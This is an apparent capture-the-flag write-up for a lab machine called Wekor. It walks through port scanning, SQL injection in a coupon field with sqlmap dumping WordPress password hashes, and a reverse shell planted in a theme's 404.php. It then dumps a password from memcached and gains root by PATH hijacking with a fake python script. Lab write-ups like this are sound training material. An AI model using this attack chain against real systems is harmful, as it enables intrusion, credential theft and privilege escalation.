## Wekor

# Enumeration
```
# Nmap 7.91 scan initiated Tue Mar  9 10:38:35 2021 as: nmap -sC -sV -oN nmap/initial -vvv -p 22,80 10.10.203.59
Nmap scan report for wekor.thm (10.10.203.59)
Host is up, received reset ttl 61 (0.15s latency).
Scanned at 2021-03-09 10:38:35 PST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn0l/KSmAk6LfT9R73YXvsc6g8qGZvMS+A5lJ19L4G5xbhSpCoEN0kBEZZQfI80sEU7boAfD0/VcdFhURkPxDUdN1wN7a/4alpMMMKf2ey0tpnWTn9nM9JVVI9rloaiD8nIuLesjigq+eEQCaEijfArUtzAJpESwRHrtm2OWTJ+PYNt1NDIbQm1HJHPasD7Im/wW6MF04mB04UrTwhWBHV4lziH7Rk8DYOI1xxfzz7J8bIatuWaRe879XtYA0RgepMzoXKHfLXrOlWJusPtMO2x+ATN2CBEhnNzxiXq+2In/RYMu58uvPBeabSa74BthiucrdJdSwobYVIL27kCt89
|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKJLaFNlUUzaESL+JpUKy/u7jH4OX+57J/GtTCgmoGOg4Fh8mGqS8r5HAgBMg/Bq2i9OHuTMuqazw//oQtRYOhE=
|   256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvvZ5IaMI7DHXHlMkfmqQeKKGHVMSEYbz0bYhIqPp62
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 9 disallowed entries
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot
|_/comingreallysoon /interesting
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  9 10:38:48 2021 -- 1 IP address (1 host up) scanned in 13.64 seconds
```

Off the bat we can seee some disallowed entries in robots.txt so lets take a look at them. Most of them are simply not found however on /comingreallysoon/ we find the following note
```
Welcome Dear Client! We've setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot ! 
```
As the message describes going to /it-next gives us the website

# wekor.thm/it-next/
One of the tags for this room was sqli so we start by looking for fields to exploit while we begin to enumerate for any directories or subdoamins. The search function doesn't seem vulnerable however on the wekor.thm/it-next/it-cart.php page we find a field to apply a coupon upon entering ' or 1=1 -- we get the following response
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
```

This definitely seems like there is something to abuse here. So lets intercept the request and then use sqlmap to look for vulnerabilites. Upon completion we are presented alot of information but most interesting is the following
 ```
 Database: wordpress
Table: wp_users
[4 entries]
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| ID   | user_url                        | user_pass                          | user_email        | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| 1    | http://site.wekor.thm/wordpress | $P$Bo{Hash}31B. | admin@wekor.thm   | admin      | 0           | admin        | admin         | 2021-01-21 20:33:37 | <blank>                                       |
| 5743 | http://jeffrey.com              | $P$BU{Hash}j10 | jeffrey@wekor.thm | wp_jeffrey | 0           | wp jeffrey   | wp_jeffrey    | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |
| 5773 | http://yura.com                 | $P$B6{Hash}SV/ | yura@wekor.thm    | wp_yura    | 0           | wp yura      | wp_yura       | 2021-01-21 20:35:27 | <blank>                                       |
| 5873 | http://eagle.com                | $P$Bp{Hash}QY/ | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | <blank>                                       |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
```

We can go ahead and crack 3 of these hashes with rockyou except for the admin one, it is important to note also the presence of a subdomain site to access the wordpress site
so lets add this to our hosts file and then navigate to the page

# site.wekor.thm/wordpress
Here we find the wordpress site that we dumped users for above. We can find the login panel at /wp-admin, so lets try our credentials that we managed to crack
We find that wp_jeffrey is just a simple user, however when moving on to wp_yura we find it has admin privileges and can access the admin panel so lets insert a reverse shell on one of the pages and then use it to gain a foothold
appearance->theme editor-> 404.php
{insert reverse shell}
navigate to /wp-content/themes/twentytwentyone/404.php with our listener up
```
listening on [any] 4242 ...
connect to [10.13.1.12] from (UNKNOWN) [10.10.203.59] 50206
Linux osboxes 4.15.0-133-generic #137~16.04.1-Ubuntu SMP Fri Jan 15 02:55:05 UTC 2021 i686 i686 i686 GNU/Linux
 16:31:20 up  2:55,  0 users,  load average: 0.06, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
whoami
www-data
```

# Initial foothold
We fix our shell and begin to look for privilege escalation routes, there is nothing of note until we find the following
```
netstat -lptu
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 localhost:3010          *:*                     LISTEN      -
tcp        0      0 localhost:mysql         *:*                     LISTEN      -
tcp        0      0 localhost:11211         *:*                     LISTEN      -
tcp        0      0 *:ssh                   *:*                     LISTEN      -
tcp        0      0 localhost:ipp           *:*                     LISTEN      -
tcp6       0      0 [::]:http               [::]:*                  LISTEN      -
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -
tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN      -
udp        0      0 *:mdns                  *:*                                 -
udp        0      0 *:44521                 *:*                                 -
udp        0      0 *:35316                 *:*                                 -
udp        0      0 *:bootpc                *:*                                 -
udp        0      0 *:ipp                   *:*                                 -
udp6       0      0 [::]:mdns               [::]:*                              -
udp6       0      0 [::]:39028              [::]:*                              -

```

We have some ports open locally, looking up port 11211 we find that it is used for the memcached protocol we can connect to it via telnet and see if we can find any cached data to exfiltrate

```
telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
stats items
stats items
STAT items:1:number 5
STAT items:1:age 600
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 0
STAT items:1:lrutail_reflocked 0
END
stats cachedump 1 0
stats cachedump 1 0
ITEM id [4 b; 1615325783 s]
ITEM email [14 b; 1615325783 s]
ITEM salary [8 b; 1615325783 s]
ITEM password [15 b; 1615325783 s]
ITEM username [4 b; 1615325783 s]
END
get username
get username
VALUE username 0 4
Orka
END
get password
get password
VALUE password 0 15
{Orka's password}
END
```

To explain the above,
stats items: allows us to see everything in the cache
stats cachedump 1 0: will dump everything with slab id 1
get {ITEM}: read the item we wish to see
with the above we presumably have credentials for the Orka user so lets switch over

# Orka
We find the user flag in Orka's home directory, and the following
```
sudo -l

Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
Orka@osboxes:~$
```

We import the binary to our local machine and analyze it with ghidra. We find the password in plaintext to allow us to use the binary and then explore what it is doing. 
    else {
      sprintf(local_78,"python /home/Orka/Desktop/transfer.py %c",(int)local_88);
      system(local_78);
    }
The following part of the binary has it use call python directly and run the transfer.py file so lets see if we can exploit something here
```
cat transfer.py
import time
import socket
import sys
import os

result = sys.argv[1]

print "Saving " + result + " BitCoin(s) For Later Use "

test = raw_input("Do you want to make a transfer? Y/N : ")

if test == "Y":
        try:
                print "Transfering " + result + " BitCoin(s) "
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                connect = s.connect(("127.0.0.1",3010))
                s.send("Transfer : " + result + "To https://transfer.bitcoins.com")
                time.sleep(2.5)
                print ("Transfer Completed Successfully...")
                time.sleep(1)
                s.close()
        except:
                print("Error!")
else:
        print("Quitting...")
        time.sleep(1)
```

We cannot directly edit this file so lets try and hijack something, we can't write to this directory but going back to our sudo -l output we can try and find a place in our path that we can write to. We find that /usr/sbin is writeable and in our path above /usr/bin, which we can confirm is the location of python on our system
```
which python
/usr/bin/python
```

As such we can make a python file in /usr/sbin/python as follows
```
#!/bin/bash
/bin/bash
```

and it should take higher precendence over the actual python binary and result in a shell. We do the above and successfully spawn a root shell and can find the root flag in /root!
